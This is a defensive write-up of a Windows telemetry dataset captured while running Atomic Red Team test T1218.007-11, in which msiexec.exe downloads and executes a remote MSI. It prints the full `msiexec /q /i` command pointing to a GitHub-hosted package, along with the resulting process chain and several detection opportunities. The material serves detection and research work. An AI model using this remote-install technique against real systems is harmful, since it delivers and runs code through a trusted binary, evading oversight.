# T1218.007-11: Msiexec — Execute Remote MSI File

## Technique Context

T1218.007-11 tests the most impactful variant of Msiexec abuse: downloading and executing a remote MSI file directly from a URL. Instead of staging the MSI locally first, this test passes a full HTTPS URL to `msiexec.exe`'s `/i` flag. The Windows Installer service accepts URLs as package sources, downloads the MSI, and executes it — all through the trusted signed `msiexec.exe` binary. This enables an attacker to deliver and execute payloads from remote infrastructure without writing a staging file to disk first.

The detection significance is high: `msiexec.exe` making outbound HTTPS connections to download installer packages from arbitrary URLs is rarely expected in normal enterprise operations. Legitimate software deployment typically uses internal distribution points or SCCM/Intune rather than direct-to-internet MSI downloads by `msiexec.exe` itself.

This test retrieves `T1218.007_JScript.msi` from GitHub's raw content CDN, which contains an embedded JScript custom action that spawns a PowerShell process with a visible payload message.

The dataset was collected on ACME-WS06 (Windows 11 Enterprise, domain-joined to acme.local) with Windows Defender disabled.

## What This Dataset Contains

The dataset contains 157 total events: 98 PowerShell, 6 Security, 46 Sysmon, and 7 Application. This is the largest event set in the T1218.007 group, reflecting the additional network activity and the successful full installation lifecycle.

**The complete attack chain is captured in Security EID 4688:**

1. `"cmd.exe" /c c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"` — cmd.exe with the remote URL
2. `c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"` — msiexec.exe executing with the URL
3. `C:\Windows\System32\MsiExec.exe -Embedding CE22DAA47BAD87445B5C99134B2F1C4B E Global\MSI0000` — the embedded installation worker process
4. `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -Command Write-Host JScript executed me!; exit` — the JScript payload's spawned process
5. `"C:\Windows\system32\whoami.exe"` — ATH framework success verification

**Sysmon EID 3 (Network Connection)** records two outbound connections from `msiexec.exe`:
- Destination IP: `185.199.109.133` (GitHub CDN), port 443, from `192.168.4.16:51089`
- Destination IP: `140.82.112.4` (GitHub), port 443, from `192.168.4.16:51088`

Both tagged with `technique_id=T1218,technique_name=Signed Binary Proxy Execution`.

**Sysmon EID 22 (DNS Query)** records two events showing `msiexec.exe` resolving `raw.githubusercontent.com` prior to the downloads.

**Sysmon EID 1** captures the full process chain: powershell → cmd → msiexec → msiexec (embedding) → powershell.exe (`-nop -Command Write-Host JScript executed me!; exit`) and two `whoami.exe` executions.

**Sysmon EID 11 (File Created)** records 4 events showing msiexec writing files during the installation: MSI working files in `C:\Windows\Installer\`.

**Application log** provides the richest installer lifecycle data: EID 1040 (transaction start), EID 1033 (install success, package "Atomic Red Team Test Installer"), EID 11707 (product installation completed), EID 10000/10001 (MsiInstaller informational events), and EID 1042 (transaction end). The application log explicitly names the installed package.

**PowerShell EID 4104** captures the JScript payload command: `Write-Host JScript executed me!; exit` executed within the spawned PowerShell process.

## What This Dataset Does Not Contain

The dataset does not contain Sysmon EID 1 events for `cmd.exe` process creation — the sysmon-modular include-mode filter does not match `cmd.exe` for ProcessCreate in this configuration, so cmd is only visible in Security 4688. This is a minor coverage gap given the Security channel captures it.

No Sysmon events capture the TLS handshake details or the actual bytes transferred during the MSI download. The network events show the connections were made, not their content.

No registry events show the product registration entries that Windows Installer typically creates on successful installation.

## Assessment

This is the highest-fidelity dataset in the T1218.007 series. The technique executes completely and successfully, generating network telemetry (DNS + TCP connections), process creation chains, Windows Installer application log entries, and PowerShell script block evidence of the JScript payload running. Every stage of the attack — download, install, payload execution — is represented in the data.

Compared to the defended variant (40 Sysmon, 21 Security, 36 PowerShell, 6 Application), this undefended run produced more Sysmon events (46 vs. 40) and fewer Security events (6 vs. 21). The defended run's higher Security event count reflects the process access and privilege audit events generated when Defender actively scanned the download and installation — without Defender, the process runs cleanly with less audit noise.

## Detection Opportunities Present in This Data

**Security EID 4688:** The command line `c:\windows\system32\msiexec.exe /q /i "https://..."` contains the URL directly. Any `msiexec.exe` invocation with an HTTP or HTTPS URL in the command line is highly suspicious and extremely rare in legitimate operations.

**Sysmon EID 22 (DNS Query):** `msiexec.exe` resolving `raw.githubusercontent.com` is an anomalous DNS query for a Windows Installer process. In real attacks, the domain would be attacker-controlled infrastructure.

**Sysmon EID 3 (Network Connection):** `msiexec.exe` making outbound HTTPS connections, tagged by sysmon-modular as `technique_id=T1218,technique_name=Signed Binary Proxy Execution`, is a direct behavioral detection.

**Sysmon EID 1:** The process chain `msiexec.exe (embedding) → powershell.exe -nop -Command Write-Host JScript executed me!; exit` — PowerShell spawned as a child of `msiexec.exe` with `-nop` and inline command execution — is highly anomalous. Legitimate MSI custom actions do not spawn PowerShell with `-nop` and arbitrary inline commands.

**Application Log EID 1033/11707:** Package name "Atomic Red Team Test Installer" appears here. In real attacks, the attacker-controlled package name would be visible in these events, providing another data point for investigation.
